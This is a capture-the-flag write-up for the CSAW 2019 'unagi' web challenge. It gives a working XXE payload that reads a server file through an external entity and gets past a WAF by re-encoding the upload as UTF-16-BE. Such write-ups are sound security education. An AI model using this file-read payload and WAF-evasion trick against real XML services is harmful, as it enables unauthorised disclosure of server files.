# unagi (200 pts)

> come get me
> http://web.chal.csaw.io:1003

Upon visiting the web page, we are presented with a navbar containing 
> Home | User | Upload | About

We are able to learn that the webserver is running Apache + PHP through basic observation. (Links contain .php, Server included in response headers)

For `User`, the contents are

```
Name: Alice
Email: alice@fakesite.com
Group: CSAW2019
Intro: Alice is cool

Name: Bob
Email: bob@fakesite.com
Group: CSAW2019
Intro: Bob is cool too
```


For `Upload`, we are given a _`sample.xml`_ and an option to upload our own xml. The contents of _`sample.xml`_ are as follows:

```xml
<users>
    <user>
        <username>alice</username>
        <password>passwd1</password>
        <name>Alice</name>
        <email>alice@fakesite.com</email>
        <group>CSAW2019</group>
    </user>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name> Bob</name>
        <email>bob@fakesite.com</email>
        <group>CSAW2019</group>
    </user>
</users>
```

Interestingly, there is no `<intro></intro>` element as shown in the `User` page. When we copy the sample verbatim and upload it, we get an output of
```
Name: Alice
Email: alice@fakesite.com
Group: CSAW2019

Name: Bob
Email: bob@fakesite.com
Group: CSAW2019
```

So lets try a basic XXE injection with PHP wrapper using `<!DOCTYPE user [<!ENTITY flag SYSTEM "file:///flag.txt">]>` . This time we get a message saying `WAF blocked file upload` or something amongst those lines.

Upon googling around, I came upon [this article](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0). According to method 3, some WAF may not be able to parse different encodings. So we try to save our file as `UTF-16-BE` in any code editor (VSCode in my case) and upload it. 

The upload works, and the injection succeeds however we can only see 20 `A`'s. Apparently the output truncated. After wasting huge amount of time, I remembered about the `<intro></intro>` element. Apparently it is not truncated so we use it to get our flag.

Solution (saved in `UTF-16-BE` encoding):
```xml
<!DOCTYPE user [ <!ENTITY flag SYSTEM "file:///flag.txt">]>
<users>
    <user>
        <name>name</name>
        <email>email</email>
        <group>group</group>
        <intro>&flag;</intro>
    </user>
</users>

<!-- flag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts} -->
```